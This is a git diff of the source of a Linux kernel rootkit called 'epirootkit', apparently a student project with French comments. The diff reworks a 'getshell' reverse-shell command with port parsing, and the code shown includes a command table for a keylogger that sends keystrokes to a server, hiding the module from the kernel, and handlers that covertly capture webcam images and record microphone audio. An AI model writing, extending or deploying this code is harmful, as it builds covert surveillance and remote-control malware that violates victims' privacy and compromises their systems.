@@ -1,12 +1,12 @@
 #include <linux/delay.h>
 #include <linux/inet.h>
 #include <linux/kernel.h>
+#include <linux/kmod.h>
 #include <linux/kthread.h>
 #include <linux/module.h>
 #include <linux/net.h>
 #include <linux/socket.h>
 #include <linux/string.h>
-#include <linux/kmod.h>
 
 #include "epirootkit.h"
 
@@ -38,7 +38,7 @@ int exec_handler(char *args);
 int klgon_handler(char *args);
 int klgoff_handler(char *args);
 int klg_handler(char *args);
-int shellon_handler(char *args);
+int getshell_handler(char *args);
 int killcom_handler(char *args);
 int hide_module_handler(char *args);
 int unhide_module_handler(char *args);
@@ -58,7 +58,7 @@ static struct command rootkit_commands_array[] = {
     { "klgon", 6, "activate keylogger", 20, klgon_handler },
     { "klgoff", 7, "deactivate keylogger", 21, klgoff_handler },
     { "klg", 3, "send keylogger content to server", 35, klg_handler },
-    { "getshell", 8, "launch reverse shell", 20, shellon_handler },
+    { "getshell", 8, "launch reverse shell", 20, getshell_handler },
     { "killcom", 7, "exit the module", 16, killcom_handler },
     { "hide_module", 11, "hide the module from the kernel", 34, hide_module_handler },
     { "unhide_module", 13, "unhide the module in the kernel", 36, unhide_module_handler },
@@ -231,15 +231,27 @@ int klg_handler(char *args) {
     return ret_code;
 }
 
-int shellon_handler(char *args)
-{
-    DBG_MSG("shellon_handler: shellon received, launching reverse shell on port %d\n", port);
+int getshell_handler(char *args) {
+    // remove all trailing space in args
+    args += strspn(args, " \t");
+    args[strcspn(args, "\n")] = '\0';
+    // check if all chars are numbers
+    if (args[0] == '\0') {
+        DBG_MSG("getshell_handler: no port specified, using default port %d\n", REVERSE_SHELL_PORT);
+        args = "0";
+    }
+    long shellport = simple_strtol(args, NULL, 10);
+    if (shellport < 0 || shellport > 65535) {
+        ERR_MSG("getshell_handler: invalid port number %ld\n", shellport);
+        send_to_server("Invalid port number\n");
+        return -EINVAL;
+    }
 
     // Lancer le reverse shell avec le port spécifié
     int ret_code = launch_reverse_shell(args);
 
     if (ret_code < 0)
-        ERR_MSG("shellon_handler: failed to launch reverse shell on port %d\n", port);
+        ERR_MSG("getshell_handler: failed to launch reverse shell on port %ld\n", shellport);
 
     return ret_code;
 }
@@ -306,8 +318,7 @@ int show_dir_handler(char *args) {
     return ret_code;
 }
 
-int list_dir_handler(char *args)
-{
+int list_dir_handler(char *args) {
     char *buf;
     int len;
 
@@ -326,8 +337,7 @@ int list_dir_handler(char *args)
 }
 
 // Commande pour démarrer la webcam et capturer une image
-int start_webcam_handler(char *args)
-{
+int start_webcam_handler(char *args) {
     static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i", "/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2", "/tmp/capture.jpg", NULL };
     static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
 
@@ -341,8 +351,7 @@ int start_webcam_handler(char *args)
 }
 
 // Commande pour capturer une image de la webcam
-int capture_image_handler(char *args)
-{
+int capture_image_handler(char *args) {
     static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i", "/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2", "/tmp/capture.jpg", NULL };
     static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
 
@@ -367,8 +376,7 @@ int capture_image_handler(char *args)
 }
 
 // Commande pour démarrer l'enregistrement du microphone
-int start_microphone_handler(char *args)
-{
+int start_microphone_handler(char *args) {
     static char *argv[] = { "/usr/bin/arecord", "-D", "plughw:1,0", "-f", "cd", "-t", "wav", "-d", "10", "/tmp/audio.wav", NULL };
     static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
 
@@ -382,8 +390,7 @@ int start_microphone_handler(char *args)
 }
 
 // Commande pour jouer un fichier audio
-int play_audio_handler(char *args)
-{
+int play_audio_handler(char *args) {
     static char *argv[] = { "/usr/bin/aplay", "/tmp/audio.wav", NULL };
     static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
 
